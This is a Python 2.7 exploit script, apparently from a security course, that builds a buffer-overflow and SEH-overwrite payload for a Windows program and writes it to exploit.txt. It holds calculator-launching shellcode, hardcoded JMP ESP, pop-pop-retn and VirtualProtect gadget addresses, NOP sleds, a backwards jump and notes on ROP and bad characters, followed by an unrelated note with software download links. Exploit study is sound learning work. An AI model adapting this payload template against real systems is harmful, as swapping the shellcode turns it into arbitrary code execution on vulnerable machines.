#Exploit in python 2.7
from struct import pack

#Turn off sehop - https://samsclass.info/127/proj/p15-seha.htm

buf =  b"" #launch calculator shellcode
buf += b"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
buf += b"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
buf += b"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
buf += b"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
buf += b"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
buf += b"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
buf += b"\x45\x81\x3e\x43\x72\x65\x61\x75"
buf += b"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
buf += b"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
buf += b"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
buf += b"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
buf += b"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
buf += b"\x6c\x63\x89\xe2\x52\x52\x53\x53"
buf += b"\x53\x53\x53\x53\x52\x53\xff\xd7"

print("shellcode length = {}".format(len(buf)))

#RETN Address: 0x77ec1053 in ntdll.dll
#JMP ESP Address: 0x77f1e871 in ntdll.dll
#pushad # retn = 0x77ec1052 in kernel32.dll
#virtual protect address: 0x77E22341 in kernel32.dll
jmp_esp = pack("l", 0x77f1e871)
retn = pack("l", 0x77ec1053)
virtual_protect = pack("l", 0x77e22341)
push_ad = pack("l", 0x77ec1052)
junk1 = (1340-1032-4)*"Z"
nop = "\x90" * 8
junk2 = "Z" * 100
retn_shellcode_address = pack("l", 0x01010101) #pointer to my shellcode... esp? Use PUSHAD
lpAddress = pack("l", 0x01010101) #pointer to my shellcode... esp? Use PUSHAD
shellcode_size = 'xxxx' #size of my shellcode...? 800 sounds good enough. 351+100 pre nops.
fl_new_protect = 'xxxx' #0x40 or 0x20?
fl_old_protect = 'xxxx' #Find Writable Address  
args = lpAddress + shellcode_size + fl_new_protect + fl_old_protect
shellcode = buf #351 long shellcode
pop_pop_retn = pack("l", 0x77ede28d)
jmp_short_bytecode =  "\x08\xE9\x90\x90" #Need to make this bytecode for jmp short / jmp 4bytes / jmp 6 bytes
jmp_backwards_900 = "\x90\x90\x90\xe9\x77\xfc\xff\xff" # from jmp_shellcode.asm
# junk0 = "A"*1032
# #A * 1012 == Just before EIP 
# #A * 1340 == SEH record
# eip = "DDDD"
# junk1 = (1340-1032-4)*"Z"
junk0 = "A" * 1012
pointer_to_seh_handler =  jmp_short_bytecode
# pointer_to_seh_handler =  "BBBB"
# se_handler = "CCCC" #Need to make this pointer to pop pop retn #EIP
se_handler = pop_pop_retn

f = open("exploit.txt", "w")
# payload = junk0 + eip + junk1 + pointer_to_seh_handler + se_handler + virtual_protect + retn_shellcode_address + args + nop + shellcode + junk2
# payload = junk0 + retn + virtual_protect + retn_shellcode_address + args # + nop + shellcode + junk2
# payload = junk0 + jmp_esp + nop + shellcode + "\x01" * 2 # + retn_shellcode_address + args # + nop + shellcode + junk2
total_overflow_length = 1012
before_payload_nops = 150
after_payload_nops = total_overflow_length - len(shellcode) - before_payload_nops
payload = "\x90" * before_payload_nops + shellcode + "\x90" * after_payload_nops + jmp_esp + jmp_backwards_900
# payload = "\x90" * before_payload_nops + "\x90" * len(shellcode) + "\x90" * after_payload_nops + jmp_esp + jmp_backwards_900
f.write(payload)
f.close()
print("exploit.txt created. Length: {}".format(len(payload)))

# common bad characters are:

#     00 for NULL
#     0A for Line Feed n
#     0D for Carriage Return r
#     FF for Form Feed f


# VirtualProtect
# # # Calling VirtualProtect with parameters
# parameters = struct.pack('<L', 0x77e22e15)    # kernel32.VirtualProtect()
# parameters += struct.pack('<L', 0x4c4c4c4c)    # return address (address of shellcode, or where to jump after VirtualProtect call. Not officially apart of the "parameters"
# parameters += struct.pack('<L', 0x45454545)    # lpAddress
# parameters += struct.pack('<L', 0x03030303)    # size of shellcode
# parameters += struct.pack('<L', 0x54545454)    # flNewProtect
# parameters += struct.pack('<L', 0x62506060)    # pOldProtect (any writeable address)


# PUSHAD output
# EDI
# ESI
# EBP
# Pointer to the stack (automatic)
# EBX
# EDX
# ECX
# EAX


# VirtualProtect PUSHAD output Requirement
# EDI
# ESI
# EBP
# Pointer to the stack (automatic)
# EBX
# EDX
# ECX
# EAX

# Justin,

# You could try the below link for Microsoft Visual Studio 2008 Express Edition
# https://download.microsoft.com/download/8/B/5/8B5804AD-4990-40D0-A6AA-CE894CBBB3DC/VS2008ExpressENUX1397868.iso

# Then because it is a .iso file you need a way of mounting it.
# I used WinCDEmu
# https://github-releases.githubusercontent.com/36779968/ad433180-20a7-11e9-9a2a-544a6987b52c?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210913%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210913T103327Z&X-Amz-Expires=300&X-Amz-Signature=3066e53680c77934d2bd7b54753b1bff053a3f09fa82012cd2f751e9499fe896&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=36779968&response-content-disposition=attachment%3B%20filename%3DWinCDEmu-4.1.exe&response-content-type=application%2Foctet-stream